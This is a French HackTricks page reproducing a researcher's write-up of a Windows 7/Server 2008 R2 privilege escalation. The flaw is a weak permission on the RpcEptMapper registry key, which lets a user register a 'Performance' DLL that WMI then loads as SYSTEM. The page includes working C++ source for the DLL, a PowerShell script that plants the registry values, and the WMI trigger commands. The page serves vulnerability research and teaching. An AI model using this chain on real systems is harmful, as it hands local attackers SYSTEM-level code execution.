<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Informations copiées depuis** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

Selon la sortie du script, l'utilisateur actuel dispose de certaines permissions d'écriture sur deux clés de registre :

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

Vérifions manuellement les permissions du service `RpcEptMapper` en utilisant l'interface graphique `regedit`. Une chose que j'apprécie vraiment dans la fenêtre _Paramètres de sécurité avancés_ est l'onglet _Permissions effectives_. Vous pouvez choisir n'importe quel nom d'utilisateur ou de groupe et voir immédiatement les permissions effectives qui sont accordées à ce principal sans avoir besoin d'inspecter toutes les ACE séparément. La capture d'écran suivante montre le résultat pour le compte `lab-user` avec de faibles privilèges.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

La plupart des permissions sont standard (par exemple : `Query Value`) mais une en particulier se démarque : `Create Subkey`. Le nom générique correspondant à cette permission est `AppendData/AddSubdirectory`, ce qui est exactement ce qui a été rapporté par le script :
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
Qu'est-ce que cela signifie exactement ? Cela signifie que nous ne pouvons pas simplement modifier la valeur `ImagePath` par exemple. Pour ce faire, nous aurions besoin de la permission `WriteData/AddFile`. Au lieu de cela, nous pouvons seulement créer une nouvelle sous-clé.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03\_registry-imagepath-access-denied.png)

Cela signifie-t-il que c'était en effet un faux positif ? Certainement pas. Que le plaisir commence !

## RTFM <a href="#rtfm" id="rtfm"></a>

À ce stade, nous savons que nous pouvons créer des sous-clés arbitraires sous `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` mais nous ne pouvons pas modifier les sous-clés et valeurs existantes. Ces sous-clés déjà existantes sont `Parameters` et `Security`, qui sont assez communes pour les services Windows.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04\_registry-rpceptmapper-config.png)

Par conséquent, la première question qui m'est venue à l'esprit était : _existe-t-il une autre sous-clé prédéfinie - telle que `Parameters` et `Security` - que nous pourrions exploiter pour modifier efficacement la configuration du service et altérer son comportement de quelque manière que ce soit ?_

Pour répondre à cette question, mon plan initial était de lister toutes les clés existantes et d'essayer d'identifier un modèle. L'idée était de voir quelles sous-clés sont _significatives_ pour la configuration d'un service. J'ai commencé à réfléchir à la manière dont je pourrais implémenter cela en PowerShell, puis trier le résultat. Cependant, avant de le faire, je me suis demandé si cette structure de registre était déjà documentée. J'ai donc cherché quelque chose comme `windows service configuration registry site:microsoft.com` et voici le tout premier [résultat](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) qui est apparu.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05\_google-search-registry-services.png)

Cela semble prometteur, n'est-ce pas ? À première vue, la documentation ne semblait pas être exhaustive et complète. Compte tenu du titre, je m'attendais à voir une sorte de structure arborescente détaillant toutes les sous-clés et valeurs définissant la configuration d'un service, mais ce n'était clairement pas le cas.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06\_doc-registry-services.png)

Néanmoins, j'ai jeté un coup d'œil rapide à chaque paragraphe. Et, j'ai rapidement repéré les mots-clés "_**Performance**_" et "_**DLL**_". Sous le sous-titre "**Performance**", nous pouvons lire ce qui suit :

> **Performance** : _Une clé qui spécifie des informations pour un suivi facultatif des performances. Les valeurs sous cette clé spécifient **le nom de la DLL de performance du pilote** et **les noms de certaines fonctions exportées dans cette DLL**. Vous pouvez ajouter des entrées de valeur à cette sous-clé en utilisant des entrées AddReg dans le fichier INF du pilote._

Selon ce court paragraphe, on peut théoriquement enregistrer une DLL dans un service de pilote afin de surveiller ses performances grâce à la sous-clé `Performance`. **OK, c'est vraiment intéressant !** Cette clé n'existe pas par défaut pour le service `RpcEptMapper`, donc il semble que c'est _exactement_ ce dont nous avons besoin. Il y a cependant un léger problème, ce service n'est définitivement pas un service de pilote. Quoi qu'il en soit, cela vaut toujours la peine d'essayer, mais nous avons besoin de plus d'informations sur cette fonctionnalité de "_Suivi des Performances_" d'abord.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07\_sc-qc-rpceptmapper.png)

> **Note :** sous Windows, chaque service a un `Type` donné. Un type de service peut être l'une des valeurs suivantes : `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` ou `SERVICE_INTERACTIVE_PROCESS (256)`.

Après quelques recherches, j'ai trouvé cette ressource dans la documentation : [Création de la clé de performance de l'application](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key).

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08\_performance-subkey-documentation.png)

Tout d'abord, il y a une belle structure arborescente qui liste toutes les clés et valeurs que nous devons créer. Ensuite, la description donne les informations clés suivantes :

* La valeur `Library` peut contenir **un nom de DLL ou un chemin complet vers une DLL**.
* Les valeurs `Open`, `Collect` et `Close` vous permettent de spécifier **les noms des fonctions** qui doivent être exportées par la DLL.
* Le type de données de ces valeurs est `REG_SZ` (ou même `REG_EXPAND_SZ` pour la valeur `Library`).

Si vous suivez les liens inclus dans cette ressource, vous trouverez même le prototype de ces fonctions ainsi que des exemples de code : [Implémentation de OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata).
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
## Rédaction d'une Preuve de Concept <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

Grâce à tous les éléments que j'ai pu rassembler dans la documentation, écrire une DLL de Preuve de Concept simple devrait être assez direct. Mais nous avons tout de même besoin d'un plan !

Lorsque j'ai besoin d'exploiter une vulnérabilité de détournement de DLL, je commence généralement par une fonction d'aide à la journalisation simple et personnalisée. Le but de cette fonction est d'écrire des informations clés dans un fichier chaque fois qu'elle est invoquée. Typiquement, je consigne le PID du processus actuel et du processus parent, le nom de l'utilisateur qui exécute le processus et la ligne de commande correspondante. Je consigne également le nom de la fonction qui a déclenché cet événement de journalisation. De cette façon, je sais quelle partie du code a été exécutée.

Dans mes autres articles, j'ai toujours omis la partie développement car je supposais qu'elle était plus ou moins évidente. Mais, je veux aussi que mes articles de blog soient accessibles aux débutants, donc il y a une contradiction. Je vais remédier à cette situation ici en détaillant le processus. Alors, lançons Visual Studio et créons un nouveau projet "_C++ Console App_". Notez que j'aurais pu créer un projet "_Dynamic-Link Library (DLL)_" mais je trouve en fait plus facile de commencer avec une application console.

Voici le code initial généré par Visual Studio :
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
Bien sûr, ce n'est pas ce que nous voulons. Nous voulons créer une DLL, pas un EXE, donc nous devons remplacer la fonction `main` par `DllMain`. Vous pouvez trouver un code squelette pour cette fonction dans la documentation : [Initialiser une DLL](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll).
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
En parallèle, nous devons également modifier les paramètres du projet pour spécifier que le fichier compilé de sortie doit être une DLL plutôt qu'un EXE. Pour ce faire, vous pouvez ouvrir les propriétés du projet et, dans la section "**General**", sélectionner "**Dynamic Library (.dll)**" comme le "**Configuration Type**". Juste en dessous de la barre de titre, vous pouvez également sélectionner "**All Configurations**" et "**All Platforms**" afin que ce paramètre soit appliqué globalement.

Ensuite, j'ajoute ma fonction d'aide personnalisée pour les logs.
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
Ensuite, nous pouvons remplir la DLL avec les trois fonctions que nous avons vues dans la documentation. La documentation indique également qu'elles doivent retourner `ERROR_SUCCESS` si elles réussissent.
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
Le projet est maintenant correctement configuré, `DllMain` est implémenté, nous avons une fonction d'aide pour les logs et les trois fonctions requises. Cependant, il manque encore une chose. Si nous compilons ce code, `OpenPerfData`, `CollectPerfData` et `ClosePerfData` seront disponibles uniquement en tant que fonctions internes, donc nous devons les **exporter**. Cela peut être réalisé de plusieurs manières. Par exemple, vous pourriez créer un fichier [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) puis configurer le projet en conséquence. Cependant, je préfère utiliser le mot-clé `__declspec(dllexport)` ([doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)), surtout pour un petit projet comme celui-ci. De cette façon, nous avons juste à déclarer les trois fonctions au début du code source.
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
Si vous souhaitez voir le code complet, je l'ai téléchargé [ici](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12).

Enfin, nous pouvons sélectionner _**Release/x64**_ et "_**Compiler la solution**_". Cela produira notre fichier DLL : `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

## Tester le PoC <a href="#testing-the-poc" id="testing-the-poc"></a>

Avant d'aller plus loin, je m'assure toujours que mon payload fonctionne correctement en le testant séparément. Le peu de temps passé ici peut économiser beaucoup de temps par la suite en vous évitant de vous engouffrer dans un terrier de lapin pendant une hypothétique phase de débogage. Pour ce faire, nous pouvons simplement utiliser `rundll32.exe` et passer le nom de la DLL et le nom d'une fonction exportée comme paramètres.
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/09_test-poc-rundll32.gif)

Génial, le fichier journal a été créé et, si nous l'ouvrons, nous pouvons voir deux entrées. La première a été écrite lorsque la DLL a été chargée par `rundll32.exe`. La seconde a été écrite lorsque `OpenPerfData` a été appelé. Ça a l'air bon ! ![:slightly_smiling_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
Maintenant, concentrons-nous sur la vulnérabilité et commençons par créer la clé de registre et les valeurs requises. Nous pouvons le faire manuellement en utilisant `reg.exe` / `regedit.exe` ou de manière programmatique avec un script. Comme j'ai déjà parcouru les étapes manuelles lors de mes recherches initiales, je vais montrer une manière plus propre de faire la même chose avec un script PowerShell. De plus, créer des clés et des valeurs de registre en PowerShell est aussi simple que d'appeler `New-Item` et `New-ItemProperty`, n'est-ce pas ? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`L'accès demandé au registre n'est pas autorisé`… Hmm, ok… Il semble que cela ne sera pas si facile après tout. ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

Je n'ai pas vraiment enquêté sur ce problème, mais je suppose que lorsque nous appelons `New-Item`, `powershell.exe` essaie en fait d'ouvrir la clé de registre parente avec certains drapeaux qui correspondent à des permissions que nous n'avons pas.

Quoi qu'il en soit, si les cmdlets intégrés ne font pas l'affaire, nous pouvons toujours descendre d'un niveau et invoquer directement les fonctions DotNet. En effet, les clés de registre peuvent également être créées avec le code suivant en PowerShell.
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
```markdown
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/11_powershell-dotnet-createsubkey.png)

Nous y voilà ! En fin de compte, j'ai assemblé le script suivant afin de créer la clé et les valeurs appropriées, attendre une entrée de l'utilisateur et finalement terminer en nettoyant tout.
```
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
La dernière étape maintenant, **comment pouvons-nous tromper le service RPC Endpoint Mapper pour qu'il charge notre DLL de Performace ?** Malheureusement, je n'ai pas suivi toutes les différentes choses que j'ai essayées. Cela aurait été vraiment intéressant dans le contexte de cet article de blog de souligner à quel point la recherche peut parfois être fastidieuse et chronophage. Quoi qu'il en soit, une chose que j'ai découverte en cours de route est que vous pouvez interroger les _Compteurs de Performance_ en utilisant WMI (_Windows Management Instrumentation_), ce qui n'est finalement pas trop surprenant. Plus d'infos ici : [_Types de Compteurs de Performance WMI_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _Les types de compteurs apparaissent comme le qualificatif CounterType pour les propriétés dans les classes_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _, et comme le qualificatif CookingType pour les propriétés dans les classes_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _._

J'ai donc d'abord énuméré les classes WMI liées aux _Données de Performance_ dans PowerShell en utilisant la commande suivante.
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12_powershell-get-wmiobject.gif)

Et, j'ai vu que mon fichier journal a été créé presque immédiatement ! Voici le contenu du fichier.
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
Je m'attendais à obtenir une exécution de code arbitraire en tant que `NETWORK SERVICE` dans le contexte du service `RpcEptMapper` au mieux, mais il semble que j'ai obtenu un résultat bien meilleur que prévu. J'ai en fait obtenu une exécution de code arbitraire dans le contexte du service `WMI` lui-même, qui s'exécute en tant que `LOCAL SYSTEM`. N'est-ce pas incroyable ? ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **Note :** si j'avais obtenu une exécution de code arbitraire en tant que `NETWORK SERVICE`, j'aurais été à seulement un jeton de compte du `LOCAL SYSTEM` grâce à l'astuce qui a été démontrée par James Forshaw il y a quelques mois dans ce billet de blog : [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

J'ai également essayé d'obtenir chaque classe WMI séparément et j'ai observé exactement le même résultat.
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## Conclusion <a href="#conclusion" id="conclusion"></a>

Je ne sais pas comment cette vulnérabilité a pu passer inaperçue pendant si longtemps. Une explication est que d'autres outils cherchaient probablement un accès en écriture complet dans le registre, alors que `AppendData/AddSubdirectory` était en fait suffisant dans ce cas. Concernant la "mauvaise configuration" elle-même, je suppose que la clé de registre a été définie de cette manière pour un objectif spécifique, bien que je ne puisse penser à aucun scénario concret dans lequel les utilisateurs auraient un quelconque droit de modifier la configuration d'un service.

J'ai décidé d'écrire publiquement sur cette vulnérabilité pour deux raisons. La première est que je l'ai effectivement rendue publique - sans m'en rendre compte initialement - le jour où j'ai mis à jour mon script PrivescCheck avec la fonction `GetModfiableRegistryPath`, qui était il y a plusieurs mois. La seconde est que l'impact est faible. Elle nécessite un accès local et n'affecte que les anciennes versions de Windows qui ne sont plus prises en charge (à moins que vous n'ayez acheté le Support Étendu...). À ce stade, si vous utilisez encore Windows 7 / Server 2008 R2 sans avoir correctement isolé ces machines dans le réseau au préalable, alors empêcher un attaquant d'obtenir les privilèges SYSTEM est probablement le cadet de vos soucis.

Outre l'aspect anecdotique de cette vulnérabilité d'élévation de privilèges, je pense que ce paramètre de registre "Perfomance" ouvre des opportunités vraiment intéressantes pour l'exploitation postérieure, le mouvement latéral et l'évasion d'AV/EDR. J'ai déjà quelques scénarios particuliers en tête mais je n'en ai encore testé aucun. À suivre ?...

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
